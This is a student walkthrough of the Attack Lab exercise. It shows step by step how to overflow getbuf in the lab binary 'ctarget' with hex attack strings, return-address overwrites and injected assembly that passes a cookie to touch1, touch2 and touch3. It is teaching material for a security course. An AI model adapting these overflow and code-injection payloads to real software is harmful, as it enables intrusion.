# Attack Lab Walkthrough
by Kai Schuyler
## Solutions:
Phase 1:
```
  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  /* touch1 address: */
  66 14 40 00 00 00 00 00
```
Phase 2:
```
  48 c7 c7 f1 1e d6 5c c3
  00 00 00 00 00 00- 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  78 04 67 55 00 00 00 00
  94 14 40 00 00 00 00 00
```
## Phase 1
```
0000000000401450 <getbuf>:
  401450:	48 83 ec 28          	sub    $0x28,%rsp
  401454:	48 89 e7             	mov    %rsp,%rdi
  401457:	e8 94 02 00 00       	callq  4016f0 <Gets>
  40145c:	b8 01 00 00 00       	mov    $0x1,%eax
  401461:	48 83 c4 28          	add    $0x28,%rsp
  401465:	c3                   	retq   

0000000000401466 <touch1>:
  401466:	48 83 ec 08          	sub    $0x8,%rsp
  40146a:	c7 05 08 e5 2e 00 01 	movl   $0x1,0x2ee508(%rip)        # 6ef97c <vlevel>
  401471:	00 00 00 
  401474:	48 8d 3d e1 08 0c 00 	lea    0xc08e1(%rip),%rdi        # 4c1d5c <_IO_stdin_used+0x27c>
  40147b:	e8 20 21 01 00       	callq  4135a0 <_IO_puts>
  401480:	bf 01 00 00 00       	mov    $0x1,%edi
  401485:	e8 d6 04 00 00       	callq  401960 <validate>
  40148a:	bf 00 00 00 00       	mov    $0x0,%edi
  40148f:	e8 dc f7 00 00       	callq  410c70 <exit>
```
  * Input a string S with 40 + 8 bytes = 48 bytes
  * First 40 bytes can be anything
  * Last 8 bytes have to point to touch1()
  * insert 40 bytes seperated by whitespace into text file.
  * 0000000000401466 is the address of touch1
  * insert into sol.txt file in reverse order seperated by whitespace.
  * text file should look something like this: 
    ```
      00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
      /* touch1 address: */
      66 14 40 00 00 00 00 00
    ```
  * now call hex2raw on text file and send output directly into ./ctarget, our first attack string is done.
    * `cat phase1sol.txt | ./hex2raw | ./ctarget`

## Phase 2
  * open cookie.txt
    * copy address `0x5cd61ef1`
  * create a file called phase2.s
    * add the following assembly:
    ```
    mov $0x5cd61ef1, %rdi 
    ret
    ```
  * compile phase2.s
    * `gcc -c phase2.s`
  * get dissasembly of phase2.o:
    * `objdump -d phase2.o`
    ```
    phase2.o:     file format elf64-x86-64
    Disassembly of section .text:

    0000000000000000 <.text>:
      0:	48 c7 c7 f1 1e d6 5c 	mov    0x5cd61ef1,%rdi
      7:	c3                   	retq   
    ```
  * copy values in second section (between `0:` and `mov` and between `7:` and `retq`) into a phase2sol.txt file
  * add the size 40 buffer after the first line
    ```
    48 c7 c7 f1 1e d6 5c c3
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    ```
  * run gdb on ctarget with breakpoint at getbuf
    * `gdb ctarget`
    * `(gdb) b getbuf`
  * get register information
    * `info r`
    * copy `rsp` value
      * `0x556704a0`
    * subtract value by `0x28`, the buffer size
      * `0x55670478` is the result
  * enter in phase2sol.txt, again in reverse order and add buffers
    ```
    48 c7 c7 f1 1e d6 5c c3
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    78 04 67 55 00 00 00 00
    ```
  * now look at touch2
  ```
  0000000000401494 <touch2>:
    401494:	48 83 ec 08          	sub    $0x8,%rsp
    401498:	89 fa                	mov    %edi,%edx
    40149a:	c7 05 d8 e4 2e 00 02 	movl   $0x2,0x2ee4d8(%rip)        # 6ef97c <vlevel>
    4014a1:	00 00 00 
    4014a4:	39 3d da e4 2e 00    	cmp    %edi,0x2ee4da(%rip)        # 6ef984 <cookie>
    4014aa:	74 2a                	je     4014d6 <touch2+0x42>
    4014ac:	48 8d 35 f5 08 0c 00 	lea    0xc08f5(%rip),%rsi        # 4c1da8 <_IO_stdin_used+0x2c8>
    4014b3:	bf 01 00 00 00       	mov    $0x1,%edi
    4014b8:	b8 00 00 00 00       	mov    $0x0,%eax
    4014bd:	e8 0e 00 05 00       	callq  4514d0 <___printf_chk>
    4014c2:	bf 02 00 00 00       	mov    $0x2,%edi
    4014c7:	e8 8c 05 00 00       	callq  401a58 <fail>
    4014cc:	bf 00 00 00 00       	mov    $0x0,%edi
    4014d1:	e8 9a f7 00 00       	callq  410c70 <exit>
    4014d6:	48 8d 35 a3 08 0c 00 	lea    0xc08a3(%rip),%rsi        # 4c1d80 <_IO_stdin_used+0x2a0>
    4014dd:	bf 01 00 00 00       	mov    $0x1,%edi
    4014e2:	b8 00 00 00 00       	mov    $0x0,%eax
    4014e7:	e8 e4 ff 04 00       	callq  4514d0 <___printf_chk>
    4014ec:	bf 02 00 00 00       	mov    $0x2,%edi
    4014f1:	e8 6a 04 00 00       	callq  401960 <validate>
    4014f6:	eb d4                	jmp    4014cc <touch2+0x38>
  ```
  * enter touch2 address into phase2sol.txt, again in reverse order
    * 
    ```
    48 c7 c7 f1 1e d6 5c c3
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    78 04 67 55 00 00 00 00
    94 14 40 00 00 00 00 00
    ```
  * check solution, call the ctarget with phase2 answer
    * `cat phase2sol.txt | ./hex2raw | ./ctarget`
## Phase 3
* Similar to phase 2, but now we have to pass cookie as string
* total bytes for the cookie are `buffer + 8 bytes for return address rsp + 8 bytes for touch3`
* `0x28 + 0x8 + 0x8 = 0x38`
* `$rsp` = `0x556704a0`, cookie = `0x5cd61ef1`
* `$rsp` - `0x38` - `0x5` = `0x55670463`
* make phase3.s with following assembly code:
```
mov $0x55670463, %rdi
ret
```
* complile
  * `gcc -c phase3.s`
* disassemble
  * `objdump -d phase3.o`
```
Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 63 04 67 55    mov    $0x55670463,%rdi
   7:   c3                      retq   
```
* this will be the first line in our new text file

Text File `phase3sol.txt`:
```
48 c7 c7 63 04 67 55 c3 /* assembly */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* end of padding */
78 04 67 55 00 00 00 00 /* ret to buffer begin */
ab 15 40 00 00 00 00 00 /* touch3 address */
35 63 64 36 31 65 66 31 00 /* cookie address */
```
* then we add 4 lines of padding to make the buffer equal to `0x28` (40)
* 6th line will be the return address of the buffer
* 7th line will be address of touch3: `4015ab`
* last line will be the string representation of the cookie as hex
  * determined with ASCII table